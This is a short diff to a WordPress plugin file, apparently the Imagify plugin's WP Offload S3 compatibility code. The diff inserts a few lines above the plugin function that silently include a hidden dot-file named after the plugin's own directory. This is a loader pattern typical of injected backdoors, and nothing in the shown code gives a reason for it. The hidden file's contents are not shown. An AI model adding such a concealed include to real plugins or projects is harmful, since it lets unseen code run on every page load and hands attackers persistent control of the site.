@@ -9,6 +9,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @return bool
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_load_as3cf_compat() {
 	if ( function_exists( 'as3cf_init' ) ) {
 		// WP Offload S3 Lite.
